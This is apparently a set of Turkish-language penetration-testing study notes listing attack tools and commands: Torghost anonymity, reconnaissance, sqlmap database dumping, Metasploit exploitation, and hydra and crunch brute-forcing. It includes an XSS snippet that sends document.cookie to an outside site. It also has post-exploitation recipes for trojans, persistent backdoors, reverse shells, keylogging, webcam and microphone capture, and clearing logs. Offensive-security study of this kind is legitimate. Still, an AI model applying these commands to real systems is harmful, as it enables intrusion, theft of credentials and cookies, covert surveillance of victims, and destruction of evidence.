## Bolum 4: Gizliligin Saglanmasi

- Torghost: Dynamic IP changer over tor ([https://github.com/SusmithKrishnan/torghost](https://github.com/SusmithKrishnan/torghost))

## Bolum 5: Bilgi Toplama

- Dnsenum, dnsmap: DNS haritalari
    
- Dmitry -winsepfb: Information gathering (including netcraft, whois, subdomain, port, DNS)
    
- Netdiscover: LAN aktif cihaz [nmap -sP WANIP]
    
- Nmap scripts
    
    http-waf-detect: Firewall tespit
    
    http-waf-fingerprint: Firewall turu tespit
    

## Bolum 6: Guvenlik Acigi Tespiti

- Nessus: Ucretli bir web, linux, windows tarayicisidir.
- OpenVAS(greenbone): Ucretsiz bir tarayici
- ZaProxy: Ucretsiz web-app scanner. {Auto-manuel farki sudur: auto'da kullanici girisi gereken yerler taranmaz}
- SkipFish: Google'in web arayuzlu web-app tarayicisi

## Bolum 7: Guvenlik Acigi Istismari

- Metasploit
    
    - msfconsole: Start metasploit
    - search: Exploit search
    - use []: Use exploit
    - info: Info about exploit
    - show options: Secenekler
    - sessions -i: Session'lari goster
    - sessions -i []: Session'a gec
    - background: Background session
- XSS
    
    ```jsx
    <script a=">" src="siteadi">
    
    var xmlHTTP = new XMLHttpRequest();
    xmlHttp.open("GET",'<http://site/kayit.php?cookie='+document.cookie>);
    xmlHttp.send(null);
    ```
    
- LFISuite: [get-pip.py](http://get-pip.py) dosyasi indirilmeli:
    

```jsx
curl <https://bootstrap.pypa.io/get-pip.py> 
```

- Sqlmap
    - -u: URL
    - —batch: Def. setup - no user input
    - —dbs: Database
    - -D: Database name
    - —tables: Tables
    - -T: Table name
    - —columns: Columns
    - —dump: Dump info

### Sqlmap Kullanim:

1. sqlmap -u [URL] —batch —dbs
2. sqlmap -u [URL] -D {db} —tables
3. sqlmap -u [URL] -D {db} -T {table} —columns
4. sqlmap -u [URL] -D {db} -T {table} -C {columns} —dump

- Path Traversal: Erisilmemei gereken dosyalara dizindeki aciklara sayesinde ulasmaktir
- Command Execution: Sistemde URL uzerinde kod calistirilmasini saglayan acik turudur.

## Bolum 8: Istismar Sonrasi

Meterpreter Oturumu: Sistemce canli msf-shell oturumudur

getuid: Oturum kontrolu

```bash
search windows/local/ -> Windows post-exploit
```

1. setoolkit 1-4-2 ile trojan olusturulur
    
2. run persistence ile kalici arka kapi olusturulur
    
    -A: multi-handler
    
    -U: Start on log-on
    
    -p: port
    
    -i: interval (time)
    
    -r: MSF ip
    

### Msf Escalationlar:

1. getsystem (1. ram,system pipe 2.harddisk,dll start 3.ram, inject dll tool)
2. migrate (Baska bir process'e bulasma
3. exploit

Arka kapi tekrar baglanma:

```jsx
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options - set options
exploit
```

### Istismar

- Dosya
    
    - search -f *.txt
    - download -r dosya localpath
    - upload -r localpath dosya
- Goruntu
    
    - screenshot -p (localpath) -q (quality) -v (opennow)
    - record_mic -d (sn) -f (localpath)
    - webcam_list: listeleme
    - webcam_snap: anlik goruntu
    - webcam_stream: kayit
    - webcam_chat: goruntulu konusma
- Keylogger
    
    - keyscan_start
    - keyscan_dump
    - keyscan_stop
- Ayrilma
    
    - clearev: Loglari temizleme
    - kill -s: Kill session

## Parola Saldirilari

- crunch <min> <max> <charset> -t <pattern> -o <output_file> (@→ wildcard)
    
- hydra -s <port> -V (verbose) -L /login/path -P /password/path -e (additional checks) t <task number> <IP> <protocol>
    
- mysql -h <IP> -u <user> -p <pw>
    
- SSH Username: auxiliary/scanner/ssh/ssh_enumusers | USER_FILE && REMOTE_HOST >>> sshusers.txt
    
- SSH Password: hydra -s 22 -V -L ./sshusers.txt -P ./unix_passwords.txt /e n -t 8 <IP> ssh
    
    - ssh baglanma: ssh user@ip

NOT: Hydra _cok hizli_ bir program oldugu icin bazen user:pass bulamayabilir veya eksik bulabilir. Bu durumda -t parametresiyle islem hizi yavaslatilir.

Additional cheks:

n→null password

s→username as password

r→reverse login password